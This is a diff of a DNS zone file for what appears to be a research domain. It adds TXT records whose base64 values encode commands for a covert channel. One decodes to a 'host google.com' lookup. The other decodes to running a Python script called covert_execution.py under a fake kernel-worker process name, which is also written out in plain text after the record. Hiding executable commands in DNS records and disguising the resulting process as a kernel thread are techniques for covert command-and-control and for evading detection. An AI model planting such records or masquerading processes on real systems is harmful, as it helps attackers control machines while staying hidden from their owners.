@@ -11,7 +11,8 @@ $TTL	604800
 ; Name server record
 @	IN	NS	ntp-make.research.net.
 research.net.	IN	TXT	"Testing"
-covertmessage.research.net.    IN    TXT   "aG9zdCBnb29nbGUuY29t"; "Some secret message" encoded in base64/ its host google.com to generate more dns traffic
+covertmessage1.research.net.    IN    TXT   "aG9zdCBnb29nbGUuY29t"; "Some secret message" encoded in base64/ its host google.com to generate more dns traffic
+covertmessage2.research.net.    IN    TXT   "ZXhlYyAtYSAiW2t3b3JrZXIvMToxMF0iIHB5dGhvbjMgY292ZXJ0X2V4ZWN1dGlvbi5weQ==";exec -a "[kworker/1:10]" python3 covert_execution.py
 
 
 ; A record for the name server
